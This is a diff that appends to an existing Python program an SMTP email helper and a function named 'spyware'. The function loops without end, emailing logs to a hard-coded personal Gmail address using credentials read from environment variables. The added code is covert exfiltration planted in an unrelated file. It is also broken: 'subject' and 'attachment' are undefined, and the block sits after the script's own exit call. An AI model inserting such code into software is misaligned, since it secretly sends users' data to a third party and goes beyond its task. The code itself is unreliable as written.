@@ -602,3 +602,61 @@ def main() -> int:
 if __name__ == "__main__":
     print(copyright)
     exit(main())
+
+
+
+
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import os
+
+def send_email(subject, body, to_email, from_email, from_password, attachment=None):
+    smtp_server = 'smtp.gmail.com'
+    smtp_port = 587
+    
+    msg = MIMEMultipart()
+    msg['From'] = from_email
+    msg['To'] = to_email
+    msg['Subject'] = subject
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    if attachment:
+        filename = os.path.basename(attachment)
+        with open(attachment, 'rb') as attachment_file:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(attachment_file.read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', f'attachment; filename={filename}')
+        msg.attach(part)
+
+    server = smtplib.SMTP(smtp_server, smtp_port)
+    server.starttls()
+    server.login(from_email, from_password)
+    text = msg.as_string()
+    server.sendmail(from_email, to_email, text)
+    server.quit()
+
+
+def spyware():
+   
+    while True:
+      
+        body = 'Logs do SpyWare'
+        to_email = 'arthur.balke1@gmail.com'
+        from_email = os.getenv('EMAIL_USER')
+        from_password = os.getenv('EMAIL_PASS')
+        #attachment = r'C:\Users\example
+
+        
+        if not from_email or not from_password:
+            raise ValueError("As variáveis de ambiente 'EMAIL_USER' e 'EMAIL_PASS' não estão definidas corretamente.")
+
+        send_email(subject, body, to_email, from_email, from_password, attachment)
+        
+        
+if __name__ == '__main__':
+    spyware()
